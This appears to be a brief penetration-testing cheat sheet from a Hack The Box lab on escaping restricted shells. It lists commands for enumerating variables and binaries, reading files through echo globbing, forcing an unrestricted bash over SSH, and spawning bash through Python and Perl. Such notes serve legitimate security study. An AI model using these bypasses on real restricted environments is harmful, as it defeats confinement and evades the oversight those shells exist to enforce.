# Escaping Restricted Shells

## Exported Variables

```sh
htb-user@ubuntu:~$ export -p
```

## [Listing Command Names](https://www.gnu.org/software/bash/manual/html_node/Programmable-Completion-Builtins.html#index-compgen)

```sh
htb-user@ubuntu:~$ compgen -c
```

## Listing Directory Contents

```sh
htb-user@ubuntu:~$ echo ~/*
```

## Reading a File

```sh
htb-user@ubuntu:~$ echo $(~/*.txt)
```

## SSH + Bash

```sh
my@attack:~$ ssh -t htb-user@10.129.205.109 "bash"
```

## SSH + Bash (No Profile)

```sh
my@attack:~$ ssh -t htb-user@10.129.205.109 "bash --noprofile --norc"
```

## Python

```sh
htb-user@ubuntu:~$ python3 -c 'import pty; pty.spawn("bash")'
```

## Perl

```sh
htb-user@ubuntu:~$ perl -e 'exec "bash";'
```
